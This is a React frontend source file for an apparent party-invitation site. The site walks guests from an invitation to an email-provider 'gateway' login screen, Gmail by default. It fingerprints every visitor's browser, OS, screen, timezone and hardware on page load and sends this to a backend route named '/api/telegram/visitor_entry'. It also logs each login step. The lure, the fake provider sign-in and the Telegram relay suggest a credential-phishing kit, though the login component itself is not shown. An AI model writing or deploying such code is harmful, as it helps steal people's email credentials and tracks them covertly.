import React, { useState, useEffect } from "react";
import { AnimatePresence, motion } from "motion/react";
import { GatewayProvider } from "./types";
import InvitationMain from "./components/InvitationMain";
import ProviderSelection from "./components/ProviderSelection";
import ProviderLogin from "./components/ProviderLogin";
import GuestDashboard from "./components/GuestDashboard";

// 💡 Capture Render's backend production URL environment string, fallback to empty string for local setups
const API_BASE_URL = import.meta.env.VITE_API_URL || "";

export default function App() {
  const [currentScreen, setCurrentScreen] = useState<"main" | "provider_select" | "login" | "dashboard">("main");
  const [selectedProvider, setSelectedProvider] = useState<GatewayProvider>("gmail");
  const [loggedEmail, setLoggedEmail] = useState("");

  // Server logging function to bridge client steps to Flask backend logs
  const logAction = async (
    type: "PAGE_VIEW" | "PROVIDER_SELECT" | "GATEWAY_LOGIN_ATTEMPT" | "LOGIN_SUCCESS" | "RSVP_SUBMITTED",
    details: string
  ) => {
    try {
      // 💡 Appended ${API_BASE_URL} to pipeline telemetry out cleanly
      await fetch(`${API_BASE_URL}/api/logs`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type, details })
      });
    } catch (err) {
      console.warn("Telemetry log failed to transmit context:", err);
    }
  };

  // Gather detailed visitor fingerprint and log the entry with server-side resolution
  const handleVisitorEntry = async () => {
    const ua = navigator.userAgent;
    let browser = "Unknown Browser";
    let os = "Unknown OS";

    // OS detection
    if (/windows/i.test(ua)) os = "Windows";
    else if (/macintosh|mac os x/i.test(ua)) os = "macOS";
    else if (/android/i.test(ua)) os = "Android";
    else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
    else if (/linux/i.test(ua)) os = "Linux";

    // Browser detection
    if (/edg/i.test(ua)) browser = "Edge";
    else if (/chrome|crios/i.test(ua) && !/edge|edg|opr|opios/i.test(ua)) browser = "Chrome";
    else if (/safari/i.test(ua) && !/chrome|crios|opr|opios/i.test(ua)) browser = "Safari";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/opr|opera/i.test(ua)) browser = "Opera";
    else if (/trident|msie/i.test(ua)) browser = "Internet Explorer";

    const fingerprint = {
      browser,
      os,
      screenSize: `${window.screen.width || 0}x${window.screen.height || 0}`,
      language: navigator.language || "Unknown Language",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone",
      cores: String(navigator.hardwareConcurrency || "Unknown"),
      platform: navigator.platform || "Unknown",
      userAgent: ua
    };

    try {
      // 💡 Appended ${API_BASE_URL} to register entry fingerprints on Render
      await fetch(`${API_BASE_URL}/api/telegram/visitor_entry`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(fingerprint)
      });
    } catch (err) {
      console.warn("Failed to dispatch visitor telemetry to server:", err);
    }
  };

  useEffect(() => {
    handleVisitorEntry();
  }, []);

  const handleStartGateway = () => {
    setCurrentScreen("provider_select");
    logAction("PAGE_VIEW", "Guest clicked 'View Party Highlights' CTA.");
  };

  const handleSelectProvider = (providerId: GatewayProvider) => {
    setSelectedProvider(providerId);
    setCurrentScreen("login");
    logAction("PROVIDER_SELECT", `Guest selected authorization provider portal: ${providerId.toUpperCase()}`);
  };

  const handleLoginSuccess = (email: string) => {
    setLoggedEmail(email);
    setCurrentScreen("dashboard");
  };

  const handleLogout = () => {
    setLoggedEmail("");
    setCurrentScreen("main");
    logAction("PAGE_VIEW", "Guest logged out and returned to welcome board.");
  };

  return (
    <div className="min-h-screen bg-floral-pattern w-full flex flex-col items-center justify-center p-4 sm:p-6 md:p-12 relative overflow-hidden select-none" id="app-root-frame">
      
      {/* Animated Mesh Gradient Background as specified in Frosted Glass theme */}
      <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-indigo-600 rounded-full blur-[120px] opacity-25 pointer-events-none"></div>
      <div className="absolute bottom-[-5%] right-[-5%] w-[45%] h-[45%] bg-emerald-500 rounded-full blur-[100px] opacity-15 pointer-events-none"></div>
      <div className="absolute top-[20%] right-[10%] w-[30%] h-[30%] bg-purple-600 rounded-full blur-[110px] opacity-20 pointer-events-none"></div>

      {/* Main presentation card wrapper with animate transitions */}
      <div className="w-full h-full flex items-center justify-center relative z-10 py-6">
        <AnimatePresence mode="wait">
          {currentScreen === "main" && (
            <motion.div key="main-screen" className="w-full flex justify-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <InvitationMain onStartGateway={handleStartGateway} />
            </motion.div>
          )}

          {currentScreen === "provider_select" && (
            <motion.div key="provider-select-screen" className="w-full flex justify-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <ProviderSelection
                onSelectProvider={handleSelectProvider}
                onBack={() => {
                  setCurrentScreen("main");
                  logAction("PAGE_VIEW", "Guest backed out of provider gateway selection.");
                }}
              />
            </motion.div>
          )}

          {currentScreen === "login" && (
            <motion.div key="login-screen" className="w-full flex justify-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <ProviderLogin
                provider={selectedProvider}
                onBack={() => {
                  setCurrentScreen("provider_select");
                  logAction("PAGE_VIEW", "Guest backed out of authentication stage back to selector.");
                }}
                onLoginSuccess={handleLoginSuccess}
                logAction={logAction}
              />
            </motion.div>
          )}

          {currentScreen === "dashboard" && (
            <motion.div key="dashboard-screen" className="w-full flex justify-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <GuestDashboard
                guestEmail={loggedEmail}
                onLogout={handleLogout}
                logAction={logAction}
              />
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    
    </div>
  );
}